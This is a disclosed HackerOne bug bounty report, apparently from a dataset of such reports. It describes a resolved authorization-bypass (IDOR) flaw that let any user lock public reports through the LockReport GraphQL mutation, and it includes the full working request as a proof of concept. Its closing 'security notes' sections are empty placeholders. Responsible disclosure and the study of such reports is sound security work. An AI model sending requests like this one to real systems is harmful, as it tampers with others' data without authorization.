---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '2139190'
original_report_id: '2139190'
title: 'IDOR: Authorization Bypass in LockReport Mutation for public reports'
weakness: Improper Access Control - Generic
team_handle: security
created_at: '2023-09-07T08:23:19.279Z'
disclosed_at: '2023-09-13T05:55:59.597Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 98
asset_identifier: hackerone.com
asset_type: URL
max_severity: critical
tags:
- hackerone
- improper-access-control-generic
---

# IDOR: Authorization Bypass in LockReport Mutation for public reports

## Metadata

- HackerOne Report ID: 2139190
- Weakness: Improper Access Control - Generic
- Program: security
- Disclosed At: 2023-09-13T05:55:59.597Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

**Summary:**
Hello team, I can lock any public report. 


### Steps To Reproduce

1. Using your account, make this request. Notice its successful. Report id is the id of any public report.
```
{"operationName":"LockReport","variables":{"product_area":"reports","product_feature":"inbox","reportId":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMTIyNjcx"},"query":"mutation LockReport($reportId: ID!) {\n   lockReport(\n    input: {report_id: $reportId}\n  ) {\n was_successful\n    errors {\n      edges {\n        node {\n          id\n          error_code\n          field\n          message\n          __typename\n        }\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n}\n"}
```

POC report: 
https://hackerone.com/reports/2122671 (accidental, Stopped testing after that)



## Impact

Lock any report

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
